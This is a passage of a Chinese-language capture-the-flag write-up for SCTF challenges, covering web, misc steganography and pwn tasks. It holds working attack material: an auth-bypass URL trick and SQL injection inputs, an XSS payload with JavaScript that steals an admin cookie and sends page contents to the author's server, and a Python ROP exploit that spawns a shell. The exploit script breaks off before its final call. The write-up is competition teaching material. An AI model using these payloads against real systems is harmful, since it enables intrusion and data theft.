style="font-size:13px;font-family:宋体;color:#333333;background:white">可以绕过基础认证。</span></p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">So</span><span style="font-size:13px;font-family:宋体;color:#333333;background:white">我百度了一下，找到了相关的文章。成功绕过验证。</span></p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">Referer</span><span style="font-size:13px;font-family:宋体;color:#333333;background:white">：</span><a href="http://wenku.baidu.com/link?url=gAakBjEaMadJOfXM45VWi3m4hlu2g7dupSnps7f2pOj8Xkh9rknQpA2osgvOwwbYPhNZk1Ui3WkEIbuvHHkmsMpnuQjf-R7JSqIdE2r021G"><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;background:white">http://wenku.baidu.com/link?url=gAakBjEaMadJOfXM45VWi3m4hlu2g7dupSnps7f2pOj8Xkh9rknQpA2osgvOwwbYPhNZk1Ui3WkEIbuvHHkmsMpnuQjf-R7JSqIdE2r021G</span></a></p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">&nbsp;</span></p><p><span style="font-size:13px;font-family:宋体;color:#333333;background:white">访问</span></p><p><a href="http://gintama.sycsec.com/admin::$INDEX_ALLOCATION/index.php"><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;background:white">http://gintama.sycsec.com/admin::$INDEX_ALLOCATION/index.php</span></a></p><p style="text-align:center"><span style="font-size: 13px;font-family: &#39;Arial&#39;,&#39;sans-serif&#39;;color: rgb(51, 51, 51);background: none repeat scroll 0% 0% white"><img style="width: 600px;height: 223px" alt="t014c333a0f17a20149.png" src="http://p4.qhimg.com/t014c333a0f17a20149.png" title="t014c333a0f17a20149.png" height="223" vspace="0" width="600" border="0"/></span></p><p><span style="font-size:13px;font-family:宋体;color:#333333;background:white">接下来是一个不同寻常的注入点，利用的是</span><span style="font-size: 13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">false</span><span style="font-size:13px;font-family:宋体;color:#333333;background:white">注入，在</span><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">exploitdb</span><span style="font-size:13px;font-family: 宋体;color:#333333;background:white">上有相关的文章（</span><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">PS:</span><span style="font-size:13px;font-family:宋体;color:#333333;background:white">貌似是完全一样的代码哦，学习了。）</span></p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">Referer</span><span style="font-size:13px;font-family:宋体;color:#333333;background:white">：</span></p><p><a href="http://www.exploit-db.com/papers/18263/"><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;background:white">http://www.exploit-db.com/papers/18263/</span></a></p><p><span style="font-size:13px;font-family:宋体;color:#333333;background:white">简单描述</span></p><p><span style="font-size:13px;font-family:宋体;color:#333333;background:white">表结构</span></p><p style="text-align:left"><span style="font-size:16px;font-family:宋体;color:black">/*</span></p><p style="text-align:left"><span style="font-size:16px;font-family:宋体;color:black">create database injection_db;</span></p><p style="text-align:left"><span style="font-size:16px;font-family:宋体;color:black">use injection_db;</span></p><p style="text-align:left"><span style="font-size:16px;font-family:宋体;color:black">create table users(num int not null, id varchar(30) not null, password varchar(30) not null, primary key(num));</span></p><p style="text-align:left"><span style="font-size:16px;font-family:宋体;color:black">&nbsp;</span></p><p style="text-align:left"><span style="font-size:16px;font-family:宋体;color:black">insert into users values(1, &#39;admin&#39;, &#39;ad1234&#39;);</span></p><p style="text-align:left"><span style="font-size:16px;font-family:宋体;color:black">insert into users values(2, &#39;wh1ant&#39;, &#39;wh1234&#39;);</span></p><p style="text-align:left"><span style="font-size:16px;font-family:宋体;color:black">insert into users values(3, &#39;secuholic&#39;, &#39;se1234&#39;);</span></p><p style="text-align:left"><span style="font-size:16px;font-family:宋体;color:black">&nbsp;</span></p><p style="text-align:left"><span style="font-size:16px;font-family:宋体;color:black">*** login.php ***</span></p><p style="text-align:left"><span style="font-size:16px;font-family:宋体;color:black">*/</span></p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">&nbsp;</span></p><pre>mysql&gt;&nbsp;select&nbsp;*&nbsp;from&nbsp;users;</pre><pre>+-----+-----------+----------+</pre><pre>|&nbsp;num&nbsp;|&nbsp;id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;password&nbsp;|</pre><pre>+-----+-----------+----------+</pre><pre>|&nbsp;&nbsp;&nbsp;1&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;ad1234&nbsp;&nbsp;&nbsp;|</pre><pre>|&nbsp;&nbsp;&nbsp;2&nbsp;|&nbsp;wh1ant&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;wh1234&nbsp;&nbsp;&nbsp;|</pre><pre>|&nbsp;&nbsp;&nbsp;3&nbsp;|&nbsp;secuholic&nbsp;|&nbsp;se1234&nbsp;&nbsp;&nbsp;|</pre><pre>+-----+-----------+----------+</pre><pre>3&nbsp;rows&nbsp;in&nbsp;set&nbsp;(0.01&nbsp;sec)</pre><p><br/></p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">&nbsp;</span></p><pre>mysql&gt;&nbsp;select&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;id=&#39;&#39;;</pre><pre>Empty&nbsp;set&nbsp;(0.00&nbsp;sec)</pre><p><br/></p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">&nbsp;</span></p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">&nbsp;</span></p><pre>mysql&gt;&nbsp;select&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;id=0;</pre><pre>+-----+-----------+----------+</pre><pre>|&nbsp;num&nbsp;|&nbsp;id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;password&nbsp;|</pre><pre>+-----+-----------+----------+</pre><pre>|&nbsp;&nbsp;&nbsp;1&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;ad1234&nbsp;&nbsp;&nbsp;|</pre><pre>|&nbsp;&nbsp;&nbsp;2&nbsp;|&nbsp;wh1ant&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;wh1234&nbsp;&nbsp;&nbsp;|</pre><pre>|&nbsp;&nbsp;&nbsp;3&nbsp;|&nbsp;secuholic&nbsp;|&nbsp;se1234&nbsp;&nbsp;&nbsp;|</pre><pre>+-----+-----------+----------+</pre><pre>3&nbsp;rows&nbsp;in&nbsp;set&nbsp;(0.00&nbsp;sec)</pre><p><br/></p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">&nbsp;</span></p><p><span style="color:black">Id=0</span><span style="font-family:宋体;color:black">时可以列出所有的记录。</span></p><p><span style="font-family:宋体;color:black">而注入点的语句是：</span></p><p><span style="color:black">Select * from users where id=’+input+’ and password=’+input+’;</span></p><p><span style="font-family:宋体;color:black">构造输入</span><span style="color:black">id=’-0%23&amp;password=123456</span></p><p><span style="font-family:宋体;color:black">因为</span><span style="color:black">mysql</span><span style="font-family:宋体;color:black">的强制转换特性，该语句被这样理解了。</span></p><p><span style="color:black">Select * from where id=’’-0# and password=’123456’;</span></p><p><span style="font-family:Wingdings;color:black">à</span><span style="color:black"> Select * from users where id=(0-0)#</span></p><p><span style="font-family:Wingdings;color:black">à</span><span style="color:black">select * from users where id=0</span></p><p><span style="font-family:宋体;color:black">成功拿到</span><span style="color:black">flag</span><span style="font-family:宋体;color:black">。</span></p><p><span style="font-size:18px;font-family:&#39;Simsun&#39;,&#39;serif&#39;;color:black">Flag: SCTF{Bypass_Auth_aNd_Easy_SQLi}</span></p><p><span style="font-size:18px;font-family:&#39;Simsun&#39;,&#39;serif&#39;;color:black">&nbsp;</span></p><p class="MsoListParagraph" style="margin-left:28px"><span style="font-family:Wingdings">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong>MISC 200</strong></p><p><span style="font-family:宋体">题目：</span></p><p style="text-align:center"><img style="width: 600px;height: 139px" alt="t01ea4568ddab6e6b26.png" src="http://p8.qhimg.com/t01ea4568ddab6e6b26.png" title="t01ea4568ddab6e6b26.png" height="139" vspace="0" width="600" border="0"/></p><p>&nbsp;</p><p><span style="font-family:宋体">下载得到一个压缩包，里面有张图片，丢</span>hex<span style="font-family:宋体">工具查看。</span></p><p style="text-align:center"><img style="width: 600px;height: 301px" alt="t011542c23bd737eedc.png" src="http://p1.qhimg.com/t011542c23bd737eedc.png" title="t011542c23bd737eedc.png" height="301" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">发现存在</span>zip<span style="font-family:宋体">压缩包，于是用</span>foremost<span style="font-family:宋体">分离得到以下文件</span></p><p style="text-align:center"><img style="width: 600px;height: 170px" alt="t016549c5d32206962d.png" src="http://p1.qhimg.com/t016549c5d32206962d.png" title="t016549c5d32206962d.png" height="170" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">第一天时</span>zip<span style="font-family:宋体">存在解压密码，</span>3.jpg<span style="font-family:宋体">用</span>stegdetect<span style="font-family:宋体">发现</span>jphide<span style="font-family:宋体">隐写，尝试无果，直接到第二天出现新提示。</span></p><p><strong>tips:</strong><strong>密钥即为文件名</strong></p><p><span style="font-family:宋体">于是尝试用</span>mp3stego<span style="font-family:宋体">，</span>sctf<span style="font-family:宋体">解压</span>4.zip<span style="font-family:宋体">发现不成功，猜想其他解法。查阅资料发现</span>zip<span style="font-family:宋体">伪加密。</span></p><p style="text-align:center"><img style="width: 600px;height: 35px" alt="t01287d2fa062ba1cf4.png" src="http://p0.qhimg.com/t01287d2fa062ba1cf4.png" title="t01287d2fa062ba1cf4.png" height="35" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">这是一个无密码的</span>zip<span style="font-family:宋体">文件</span></p><p style="text-align:center"><img alt="http://p2.qhimg.com/t0114f4b361a42b8159.png" src="http://p2.qhimg.com/t0114f4b361a42b8159.png" title="t0114f4b361a42b8159.png"/></p><p><span style="font-family:宋体">这是本题的</span>zip<span style="font-family:宋体">，可以发现在</span></p><p style="text-align:center"><img style="width: 600px;height: 118px" alt="t01b09fd4ad8753da28.png" src="http://p3.qhimg.com/t01b09fd4ad8753da28.png" title="t01b09fd4ad8753da28.png" height="118" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">存在区别，于是尝试把</span>01-&gt;00<span style="font-family:宋体">，再尝试打开，没有提示输入密码成功解压得到</span>mp3stego<span style="font-family:宋体">。</span></p><p><span style="font-family:宋体">用</span>mp3stego<span style="font-family:宋体">工具对文件进行解密。</span></p><p><br/></p><p style="text-align:center"><img style="width: 600px;height: 251px" alt="t01138e9b91f866f0e3.png" src="http://p9.qhimg.com/t01138e9b91f866f0e3.png" title="t01138e9b91f866f0e3.png" height="251" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">此处密码为</span>sctf<span style="font-family:宋体">（最初</span>jpg<span style="font-family:宋体">的文件名）。</span></p><p><span style="font-family:宋体">得到</span></p><p><br/></p><p style="text-align:center"><img style="width: 600px;height: 56px" alt="t01b38a388f603bed02.png" src="http://p0.qhimg.com/t01b38a388f603bed02.png" title="t01b38a388f603bed02.png" height="56" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">玩过</span>MC<span style="font-family:宋体">的一看端口便知道这是</span>minecraft<span style="font-family:宋体">开放的端口，下面应该就是</span>flag<span style="font-family:宋体">的坐标。</span></p><p><span style="font-family:宋体">附图：</span></p><p><img style="width: 600px;height: 305px" alt="t017d1e4495c6c22625.png" src="http://p7.qhimg.com/t017d1e4495c6c22625.png" title="t017d1e4495c6c22625.png" height="305" vspace="0" width="600" border="0"/> <br/></p><p><span style="color:black">&nbsp;</span></p><p><span style="color:black">&nbsp;</span></p><p class="MsoListParagraph" style="margin-left:28px"><span style="font-family:Wingdings;color:black">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong><span style="color:black">PT200</span></strong></p><p><strong>kali.sycsec.com</strong><strong><br/> </strong><strong>我们不是来要</strong><strong>0DAY</strong><strong>的，其实已经有公开的方法来</strong><strong>bypass.</strong><strong><br/> <span style="background:silver">tips:XSS+MySQL error-based PS:</span></strong><strong>建议参赛人员使用最新版</strong><strong>chrome</strong><strong>测试</strong></p><p><span style="font-family:宋体;color:black">有</span><span style="color:black">tip</span><span style="font-family:宋体;color:black">就是好，不用绕弯路了。</span></p><p><span style="font-family:宋体;color:black">毕竟我们队友</span><span style="color:black">CTF</span><span style="font-family:宋体;color:black">专业空气队员</span><span style="color:black">@P</span><span style="font-family:宋体;color:black">总，直接给了我一个</span><span style="color:black">xss</span><span style="font-family:宋体;color:black">的</span><span style="color:black">payload</span><span style="font-family:宋体;color:black">。</span></p><p><span style="font-family:宋体;color:black">首页查看源代码可以看到一个输出的测试页面。</span></p><p><span style="font-family:宋体;color:black">然后</span><span style="color:black">~</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 331px" alt="t01aa397df186a1993a.png" src="http://p8.qhimg.com/t01aa397df186a1993a.png" title="t01aa397df186a1993a.png" height="331" vspace="0" width="600" border="0"/></span></p><p><span style="color:black">Payload</span><span style="font-family:宋体;color:black">：</span><span style="color:black">&lt;link rel=import href=http://test.com/test.php&gt;</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 294px" alt="t01b7a0d9242d31ec44.png" src="http://p3.qhimg.com/t01b7a0d9242d31ec44.png" title="t01b7a0d9242d31ec44.png" height="294" vspace="0" width="600" border="0"/></span></p><p><span style="color:black">Test.php</span><span style="font-family:宋体;color:black">的代码是</span></p><p><span style="color:black">&lt;?php</span></p><p><span style="color:black">header(&quot;Access-Control-Allow-Origin:*&quot;);</span></p><p><span style="color:black">?&gt;</span></p><p><span style="color:black">&lt;script&gt;alert(1)&lt;/script&gt;</span></p><p><span style="font-family:宋体;color:black">马上开始打管理员的</span><span style="color:black">cookie</span><span style="font-family:宋体;color:black">。</span></p><p><a href="http://kali.sycsec.com/post.php">http://kali.sycsec.com/post.php</a><span style="font-family:宋体;color:black">，这是一个留言板。</span></p><p><span style="font-family:宋体;color:black">直接输入</span></p><p><span style="color:black">&lt;link rel=import href=http://test.com/test.php&gt;</span></p><p><span style="font-family:宋体;color:black">找了个</span><span style="color:black">xss</span><span style="font-family:宋体;color:black">平台，修改代码，提交，多输入几次打到了</span><span style="color:black">cookie</span><span style="font-family:宋体;color:black">。</span></p><p style="text-align:center"><span style="font-size: 16px;font-family: 宋体"><img style="width: 600px;height: 211px" alt="t01a59300de587788ad.png" src="http://p2.qhimg.com/t01a59300de587788ad.png" title="t01a59300de587788ad.png" height="211" vspace="0" width="600" border="0"/></span></p><p><span style="font-family:宋体;color:black">不知道是成信院哪位大牛的电脑呢</span><span style="color:black">~</span></p><p><span style="font-family:宋体;color:black">拿到了后台地址，挂上</span><span style="color:black">cookie</span><span style="font-family:宋体;color:black">，登陆。</span></p><p><span style="font-family:宋体;color:black">发现居然</span><span style="color:black">403</span><span style="font-family:宋体;color:black">了。</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 181px" alt="t01f8f3860b2610f6b7.png" src="http://p5.qhimg.com/t01f8f3860b2610f6b7.png" title="t01f8f3860b2610f6b7.png" height="181" vspace="0" width="600" border="0"/></span></p><p><span style="font-family:宋体;color:black">猜测是</span><span style="color:black">IP</span><span style="font-family:宋体;color:black">限制，又试了一下</span><span style="color:black">ip</span><span style="font-family:宋体;color:black">伪造。</span></p><p><span style="font-family:宋体;color:black">结果。。</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 141px" alt="t01494b6267ef0b0728.png" src="http://p7.qhimg.com/t01494b6267ef0b0728.png" title="t01494b6267ef0b0728.png" height="141" vspace="0" width="600" border="0"/></span></p><p><span style="font-family:宋体;color:black">好吧。。</span></p><p><span style="font-family:宋体;color:black">想到写（</span><span style="color:black">zhao</span><span style="font-family:宋体;color:black">）了个</span><span style="color:black">js</span><span style="font-family:宋体;color:black">获取管理员页面的内容。</span></p><p><span style="color:black">Js</span><span style="font-family:宋体;color:black">内容如下：</span></p><p><span style="color:black"></span></p><pre class="brush:js;toolbar:false">//构建xhrrequest包
function&nbsp;createXHR&nbsp;()&nbsp;{
var&nbsp;request&nbsp;=&nbsp;false;
if&nbsp;(window.XMLHttpRequest)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;request&nbsp;=&nbsp;new&nbsp;XMLHttpRequest();
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(request.overrideMimeType)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;request.overrideMimeType(&#39;text/xml&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;}
}&nbsp;else&nbsp;if&nbsp;(window.ActiveXObject)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;versions&nbsp;=&nbsp;[&#39;Microsoft.XMLHTTP&#39;,&nbsp;&#39;MSXML.XMLHTTP&#39;,&nbsp;&nbsp;&#39;Microsoft.XMLHTTP&#39;,&nbsp;&#39;Msxml2.XMLHTTP.7.0&#39;,&nbsp;&#39;Msxml2.XMLHTTP.6.0&#39;,&nbsp;&nbsp;&#39;Msxml2.XMLHTTP.5.0&#39;,&nbsp;&#39;Msxml2.XMLHTTP.4.0&#39;,&nbsp;&#39;MSXML2.XMLHTTP.3.0&#39;,&nbsp;&nbsp;&#39;MSXML2.XMLHTTP&#39;];
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(var&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;versions.length;&nbsp;i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;request&nbsp;=&nbsp;new&nbsp;ActiveXObject(versions);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;catch&nbsp;(e)&nbsp;{}
&nbsp;&nbsp;&nbsp;&nbsp;}
}
return&nbsp;request;
}
//get方式
function&nbsp;get&nbsp;(xhr,&nbsp;url)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;xhr.open(&quot;GET&quot;,&nbsp;url,&nbsp;false);
&nbsp;&nbsp;&nbsp;&nbsp;xhr.send();
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;xhr.responseText;
}
&nbsp;
var&nbsp;xhr&nbsp;=&nbsp;createXHR();
var&nbsp;x&nbsp;=&nbsp;get(xhr,&#39;http://kali.sycsec.com/ebcb6eb2004d1f4086ef87cdf5d678c3/&#39;);
get(xhr,&quot;http://test/login.php?key=&quot;+escape(x));</pre><p><span style="color:black">&nbsp;</span><br/></p><p><span style="font-family:宋体;color:black">其中</span><span style="color:black">login.php</span><span style="font-family:宋体;color:black">是用于把传回的代码写入我本地的一个文件中。</span></p><p><span style="font-family:宋体;color:black">返回结果如下：</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 109px" alt="t015fb5fc069c3fbaa4.png" src="http://p1.qhimg.com/t015fb5fc069c3fbaa4.png" title="t015fb5fc069c3fbaa4.png" height="109" vspace="0" width="600" border="0"/></span></p><p><span style="font-family:宋体;color:black">根据题目的</span><span style="color:black">tip</span><span style="font-family:宋体;color:black">，这应该是一个报错注入。</span></p><p><span style="font-family:宋体;color:black">使用了网络上的几个老的报错注入的</span><span style="color:black">payload</span><span style="font-family:宋体;color:black">，结果都没成功。（主办方自己写了一个过滤脚本）</span></p><p><span style="color:black">&nbsp;</span></p><p><span style="font-family:宋体;color:black">一些新型的报错注入</span><span style="color:black">payload</span><span style="font-family:宋体;color:black">又出现各种问题（我本机测试可以用的，服务器就不能用；服务器可以用的，我本机不能测试成功，因为主办方服务器</span><span style="color:black">mysql</span><span style="font-family:宋体;color:black">版本为</span><span style="color:black">5.1</span><span style="font-family:宋体;color:black">，我本机为</span><span style="color:black">5.6</span><span style="font-family:宋体;color:black">）</span></p><p><span style="font-family:宋体;color:black">最终使用</span><span style="color:black">payload</span><span style="font-family:宋体;color:black">如下：</span></p><p><span style="color:black">http://kali.sycsec.com/ebcb6eb2004d1f4086ef87cdf5d678c3/flag.php?id=1 &nbsp;and (select 1 from (select count(*),concat((select thisisflag from flag &nbsp;limit 0,1),left(rand(),3))x from information_schema.tables group by x) &nbsp;as yinfu)</span></p><p><span style="font-family:宋体;color:black">过程不表，</span><span style="color:black">flag</span><span style="font-family:宋体;color:black">在当前库的</span><span style="color:black">flag</span><span style="font-family:宋体;color:black">表下</span><span style="color:black">thisisflag</span><span style="font-family:宋体;color:black">字段下。</span></p><p><span style="font-family:宋体;color:black">修改</span><span style="color:black">js</span><span style="font-family:宋体;color:black">，给管理员发留言。</span></p><p><span style="font-family:宋体;color:black">得到返回：</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 157px" alt="t0115f997ef6d0c400f.png" src="http://p9.qhimg.com/t0115f997ef6d0c400f.png" title="t0115f997ef6d0c400f.png" height="157" vspace="0" width="600" border="0"/></span></p><p><span style="color:black">FLAG</span><span style="font-family:宋体;color:black">：</span><span style="font-size:18px;font-family:&#39;Simsun&#39;,&#39;serif&#39;;color:black">SCTF{x55_And_SqLinject}</span></p><p><span style="font-size:18px;font-family:&#39;Simsun&#39;,&#39;serif&#39;;color:black">PS</span><span style="font-size:18px;font-family:宋体;color:black">：</span></p><p><span style="font-size:18px;font-family:宋体;color:black">报错注入</span><span style="font-size:18px;font-family:&#39;Simsun&#39;,&#39;serif&#39;;color:black">payload</span><span style="font-size:18px;font-family:宋体;color:black">大全：</span><a href="http://blackfan.ru/mysql_game_v2/"><span style="font-size:18px;font-family:&#39;Simsun&#39;,&#39;serif&#39;">http://blackfan.ru/mysql_game_v2/</span></a></p><p><span style="font-size:18px;font-family:&#39;Simsun&#39;,&#39;serif&#39;;color:black">&nbsp;</span></p><p><span style="font-size:18px;font-family:&#39;Simsun&#39;,&#39;serif&#39;;color:black">&nbsp;</span></p><p><span style="font-size:18px;font-family:&#39;Simsun&#39;,&#39;serif&#39;;color:black">&nbsp;</span></p><p class="MsoListParagraph" style="margin-left:28px"><span style="font-family:Wingdings">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong>Pwn200</strong></p><p><span style="font-family:宋体">程序需要两次输入，第一次的输入有一字节的溢出，可以修改第二次输入的长度。</span></p><p style="text-align:center"><img style="width: 600px;height: 220px" alt="t01d13f12e30660ff8a.png" src="http://p9.qhimg.com/t01d13f12e30660ff8a.png" title="t01d13f12e30660ff8a.png" height="220" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">程序后面有个</span>strlen<span style="font-family:宋体">判断输入长度，用</span>/x00<span style="font-family:宋体">截断即可绕过。经过以一次一字节溢出修改</span>nbytes<span style="font-family:宋体">变量大小，修改后第二次输入出现栈溢出。</span></p><p style="text-align:center"><img style="width: 600px;height: 366px" alt="t01092f383d79d55094.png" src="http://p1.qhimg.com/t01092f383d79d55094.png" title="t01092f383d79d55094.png" height="366" vspace="0" width="600" border="0"/></p><p>Exp<span style="font-family:宋体">如下：</span></p><pre class="brush:python;toolbar:false">#coding:utf-8
__author__&nbsp;=&nbsp;&#39;Dazdingo&#39;
&nbsp;
from&nbsp;socket&nbsp;import&nbsp;*
import&nbsp;struct
import&nbsp;time
import&nbsp;threading
import&nbsp;sys
&nbsp;
is_recv&nbsp;=&nbsp;True
&nbsp;
sock_host&nbsp;=&nbsp;&#39;192.168.206.130&#39;
sock_port&nbsp;=&nbsp;8080
&nbsp;
S&nbsp;=&nbsp;socket(AF_INET,&nbsp;SOCK_STREAM)
&nbsp;
def&nbsp;send(ss,&nbsp;tail&nbsp;=&nbsp;&#39;&#39;):
&nbsp;&nbsp;global&nbsp;S
&nbsp;&nbsp;if&nbsp;tail:
&nbsp;&nbsp;&nbsp;&nbsp;ss&nbsp;+=&nbsp;tail
&nbsp;&nbsp;print&nbsp;ss
&nbsp;&nbsp;S.send(ss)
&nbsp;
def&nbsp;outputrecv():
&nbsp;&nbsp;global&nbsp;S
&nbsp;&nbsp;while&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;is_recv:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;&nbsp;S.recv(1024)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;i:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.stdout.write(i)
&nbsp;
def&nbsp;start_recv():
&nbsp;&nbsp;#start&nbsp;recv
&nbsp;&nbsp;t&nbsp;=&nbsp;threading.Thread(target&nbsp;=&nbsp;outputrecv,&nbsp;&nbsp;args&nbsp;=&nbsp;())
&nbsp;&nbsp;t.daemon&nbsp;=&nbsp;True
&nbsp;&nbsp;t.start()
&nbsp;
def&nbsp;get_shell():
&nbsp;&nbsp;#start&nbsp;recv
&nbsp;&nbsp;start_recv()
&nbsp;
&nbsp;&nbsp;global&nbsp;S
&nbsp;&nbsp;while&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(0.1)
&nbsp;&nbsp;&nbsp;&nbsp;ss&nbsp;=&nbsp;raw_input()&nbsp;+&nbsp;&#39;\n&#39;
&nbsp;&nbsp;&nbsp;&nbsp;S.send(ss)
&nbsp;
&nbsp;
def&nbsp;main():
&nbsp;&nbsp;global&nbsp;S
&nbsp;
&nbsp;&nbsp;if&nbsp;len(sys.argv)&nbsp;==&nbsp;3:
&nbsp;&nbsp;&nbsp;&nbsp;sock_host&nbsp;=&nbsp;sys.argv[1]
&nbsp;&nbsp;&nbsp;&nbsp;sock_port&nbsp;=&nbsp;int(sys.argv[2])
&nbsp;
&nbsp;&nbsp;S.connect((sock_host,&nbsp;sock_port))
&nbsp;
&nbsp;&nbsp;a&nbsp;=&nbsp;raw_input(&#39;pause&#39;)
&nbsp;&nbsp;print&nbsp;S.recv(1024)
&nbsp;
&nbsp;&nbsp;send(&#39;syclover\x001111111\xf0&#39;)
&nbsp;
&nbsp;&nbsp;print&nbsp;S.recv(1024)
&nbsp;
&nbsp;&nbsp;ebp&nbsp;=&nbsp;&#39;\x20\x99\x04\x08&#39;
&nbsp;&nbsp;libc&nbsp;=&nbsp;&#39;\x5c\x98\x04\x08&#39;&nbsp;#__libc_start_main
&nbsp;&nbsp;retaddr1&nbsp;=&nbsp;&#39;\xa0\x83\x04\x08&#39;&nbsp;#&nbsp;write
&nbsp;&nbsp;retaddr2&nbsp;=&nbsp;&#39;\xbe\x85\x04\x08&#39;&nbsp;#pop;pop;pop;ret
&nbsp;&nbsp;pop_ebp_ret&nbsp;=&nbsp;&#39;\xc0\x85\x04\x08&#39;
&nbsp;&nbsp;retaddr3&nbsp;=&nbsp;&#39;\x60\x83\x04\x08&#39;&nbsp;#&nbsp;read
&nbsp;&nbsp;retaddr4&nbsp;=&nbsp;&#39;\xd2\x85\x04\x08&#39;&nbsp;#leave&nbsp;ret
&nbsp;
&nbsp;&nbsp;&nbsp;send(&#39;A&#39;*0x9c&nbsp;+&nbsp;ebp&nbsp;+&nbsp;retaddr1&nbsp;+&nbsp;retaddr2&nbsp;+&nbsp;&#39;\x01\x00\x00\x00&#39;&nbsp;+&nbsp;libc&nbsp;+&nbsp;&nbsp;&#39;\x04\x00\x00\x00&#39;&nbsp;+pop_ebp_ret&nbsp;+&nbsp;ebp&nbsp;+&nbsp;retaddr3&nbsp;+&nbsp;retaddr4&nbsp;+&nbsp;&nbsp;&#39;\x00\x00\x00\x00&#39;&nbsp;+&nbsp;&#39;\x24\x99\x04\x08&#39;&nbsp;+&nbsp;&#39;\xf0\x00\x00\x00&#39;&nbsp;)
&nbsp;
&nbsp;&nbsp;time.sleep(1)
&nbsp;&nbsp;l&nbsp;=&nbsp;S.recv(1024)
&nbsp;
&nbsp;&nbsp;libcaddr&nbsp;=&nbsp;struct.unpack(&#39;I&#39;,&nbsp;l)[0]
&nbsp;&nbsp;print&nbsp;&#39;__libc_start_main:&#39;,hex(libcaddr)
&nbsp;&nbsp;system&nbsp;=&nbsp;libcaddr&nbsp;+&nbsp;0x26050
&nbsp;
&nbsp;&nbsp;send(struct.pack(&#39;I&#39;,&nbsp;system)&nbsp;+&nbsp;&#39;AAAA&#39;+&#39;\x30\x99\x04\x08&#39;&nbsp;+&nbsp;&#39;/bin/sh\x00&#39;)
&nbsp;
&nbsp;&nbsp;get_shell()
&nbsp;
&nbsp;
if&nbsp;__name__&nbsp;==&nbsp;&#39;__main__&#39;:
